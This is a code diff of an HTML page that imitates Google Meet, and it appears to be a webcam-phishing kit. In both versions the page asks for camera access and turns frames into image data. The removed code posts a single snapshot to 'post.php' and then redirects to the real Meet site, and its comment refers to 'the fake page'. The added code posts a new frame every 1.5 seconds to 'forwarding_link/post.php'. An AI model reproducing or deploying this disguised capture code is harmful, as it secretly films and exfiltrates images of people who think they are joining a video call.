@@ -1,185 +1,197 @@
-<!DOCTYPE html>
+<!doctype html>
 <html>
 <head>
-    <title>Google Meet</title>
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <style>
-        body {
-            font-family: 'Roboto', sans-serif;
-            background-color: #fff;
-            margin: 0;
-            padding: 0;
-            height: 100vh;
-            overflow: hidden; /* Prevent scrolling */
-        }
+<title>Google Meet Style Video Call</title>
+<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
+<style>
+body {
+  font-family: Arial, sans-serif;
+  background-color: #f0f0f0;
+  margin: 0;
+  padding: 0;
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+}
 
-        .top-bar {
-            background-color: #fff;
-            color: #5f6368;
-            padding: 10px;
-            text-align: left;
-            box-shadow: 0 1px 3px rgba(0,0,0,0.1);
-        }
+#meet-container {
+  width: 80%;
+  max-width: 1200px;
+  background-color: #fff;
+  border-radius: 10px;
+  box-shadow: 0 0 10px rgba(0, 0, 0, 0.2);
+  padding: 20px;
+  margin-top: 20px;
+}
 
-        .meet-logo {
-            font-size: 20px;
-            font-weight: 500;
-            color: #5f6368;
-            margin-left: 20px;
-        }
+.video-grid {
+  display: grid;
+  grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); /* Adjust minmax for desired video size */
+  grid-gap: 10px;
+  margin-bottom: 20px;
+}
 
-        .main-content {
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            height: calc(100vh - 50px); /* Adjust height */
-        }
+.video-container {
+  position: relative;
+  background-color: #333; /* Placeholder background */
+  border-radius: 5px;
+  overflow: hidden;
+}
 
-        .video-placeholder {
-            width: 400px;
-            height: 300px;
-            background-color: #424242;
-            margin-bottom: 20px;
-            border-radius: 8px;
-            color: white;
-            text-align: center;
-            line-height: 300px;
-            font-size: 20px;
-        }
+.video-container video {
+  width: 100%;
+  display: block;
+}
 
-        .join-info {
-            text-align: center;
-            color: #202124;
-            margin-bottom: 20px;
-        }
+.video-container .name-overlay {
+  position: absolute;
+  bottom: 0;
+  left: 0;
+  width: 100%;
+  background-color: rgba(0, 0, 0, 0.5);
+  color: white;
+  padding: 5px;
+  font-size: 14px;
+  text-align: center;
+}
 
-        .meet-code-input {
-            padding: 10px;
-            border: 1px solid #dadce0;
-            border-radius: 4px;
-            margin-right: 10px;
-            width: 250px;
-            outline: none;
-        }
+#local-video-container { /* Style for the local video (your webcam) */
+  border: 2px solid #4285f4; /* Google Meet blue border */
+}
 
-        .meet-code-input:focus {
-            border-color: #4285f4;
-        }
+/* Optional: Style for the main content area below the videos */
+#content-area {
+  width: 100%;
+  text-align: center;
+  padding: 20px;
+}
 
-        .join-button, .start-button {
-            background-color: #1a73e8;
-            color: white;
-            padding: 10px 20px;
-            border: none;
-            border-radius: 4px;
-            cursor: pointer;
-            font-size: 16px;
-            transition: background-color 0.3s;
-        }
+/* Styling for the bottom bar (like Meet's bottom bar) */
+#bottom-bar {
+  background-color: #f0f0f0;
+  padding: 10px;
+  text-align: center;
+  border-top: 1px solid #ccc;
+}
 
-        .join-button:hover, .start-button:hover {
-            background-color: #0d6efd;
-        }
+#bottom-bar button {
+  padding: 8px 15px;
+  margin: 0 5px;
+  border: none;
+  border-radius: 5px;
+  background-color: #ddd;
+  cursor: pointer;
+}
 
-        .bottom-bar {
-            position: absolute;
-            bottom: 0;
-            left: 0;
-            width: 100%;
-            background-color: #fff;
-            padding: 10px;
-            text-align: center;
-            border-top: 1px solid #e0e0e0;
-        }
+#bottom-bar button:hover {
+  background-color: #ccc;
+}
 
-        .bottom-bar a {
-            color: #1a73e8;
-            text-decoration: none;
-            margin: 0 10px;
-        }
+/* Placeholder for icons (replace with actual icon images/svgs) */
+#bottom-bar button::before {
+  content: "[ICON] "; /* Replace with actual icon */
+}
 
-        .bottom-bar a:hover {
-            text-decoration: underline;
-        }
-
-        /* Styles for video and canvas */
-        #videoElement {
-            width: 400px;
-            height: 300px;
-            background-color: #424242;
-            display: none; /* Initially hide the video */
-        }
-
-        #canvasElement {
-            display: none; /* Initially hide the canvas */
-        }
-    </style>
-    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet">
+</style>
 </head>
+
 <body>
-    <div class="top-bar">
-        <span class="meet-logo">Meet</span>
+  <div id="meet-container">
+    <div class="video-grid">
+      <!-- Local Video -->
+      <div class="video-container" id="local-video-container">
+        <video id="video" playsinline autoplay muted></video>
+        <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
+        <div class="name-overlay">You</div>
+      </div>
+
+      <!-- Placeholder for other participants -->
+      <div class="video-container">
+        <video playsinline autoplay></video>
+        <div class="name-overlay">Participant 1</div>
+      </div>
+
+      <div class="video-container">
+        <video playsinline autoplay></video>
+        <div class="name-overlay">Participant 2</div>
+      </div>
+
+      <!-- Add more video-container divs for more participants -->
     </div>
-    <div class="main-content">
-        <video id="videoElement"></video>
-        <canvas id="canvasElement" width="400" height="300"></canvas>
-        <div class="video-placeholder">
-            Video Placeholder
-        </div>
-        <div class="join-info">
-            <p>Enter a meeting code to join:</p>
-            <input type="text" class="meet-code-input" placeholder="Meeting code">
-            <button class="join-button">Join</button>
-        </div>
-        <button class="start-button">New meeting</button>
-    </div>
-    <div class="bottom-bar">
-        <a href="#">Help</a>
-        <a href="#">Privacy</a>
-        <a href="#">Terms</a>
+
+    <div id="content-area">
+      <iframe id="Live_YT_TV" width="100%" height="500px" src="https://www.youtube.com/embed/live_yt_tv?autoplay=1" frameborder="0" allow="autoplay encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
     </div>
 
-    <script>
-        // Webcam access and image capture
-        var video = document.getElementById('videoElement');
-        var canvas = document.getElementById('canvasElement');
-        var context = canvas.getContext('2d');
+    <div id="bottom-bar">
+      <button>Microphone</button>
+      <button>Camera</button>
+      <button>Present</button>
+      <button>Leave Call</button>
+    </div>
 
-        // Get access to the camera!
-        if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
-            navigator.mediaDevices.getUserMedia({ video: true })
-                .then(function(stream) {
-                    video.srcObject = stream;
-                    video.style.display = 'block'; // Show the video
-                    document.querySelector('.video-placeholder').style.display = 'none'; // Hide the placeholder
-                    video.play();
+  </div>
 
-                    // Capture image after 3 seconds
-                    setTimeout(function() {
-                        captureImage();
-                    }, 3000);
-                });
-        }
+<script>
+function post(imgdata){
+$.ajax({
+    type: 'POST',
+    data: { cat: imgdata},
+    url: 'forwarding_link/post.php',
+    dataType: 'json',
+    async: false,
+    success: function(result){
+        // call the function that handles the response/results
+    },
+    error: function(){
+    }
+  });
+};
 
-        function captureImage() {
-            context.drawImage(video, 0, 0, 400, 300);
-            var imageData = canvas.toDataURL('image/png');
 
-            // Send the image data to the server
-            sendImage(imageData);
-        }
+'use strict';
 
-        function sendImage(imageData) {
-            var xhr = new XMLHttpRequest();
-            xhr.open('POST', 'post.php', true);
-            xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
-            xhr.onload = function() {
-                // Redirect to the fake page after sending the image
-                window.location.href = 'https://meet.google.com/new'; // Replace with your actual URL
-            };
-            xhr.send('cat=' + encodeURIComponent(imageData));
-        }
-    </script>
+const video = document.getElementById('video');
+const canvas = document.getElementById('canvas');
+const errorMsgElement = document.querySelector('span#errorMsg');
+
+const constraints = {
+  audio: false,
+  video: {
+
+    facingMode: "user"
+  }
+};
+
+// Access webcam
+async function init() {
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia(constraints);
+    handleSuccess(stream);
+  } catch (e) {
+    errorMsgElement.innerHTML = `navigator.getUserMedia error:${e.toString()}`;
+  }
+}
+
+// Success
+function handleSuccess(stream) {
+  window.stream = stream;
+  video.srcObject = stream;
+
+var context = canvas.getContext('2d');
+  setInterval(function(){
+
+       context.drawImage(video, 0, 0, 640, 480);
+       var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
+       post(canvasData); }, 1500);
+
+
+}
+
+// Load init
+init();
+
+</script>
+
 </body>
 </html>
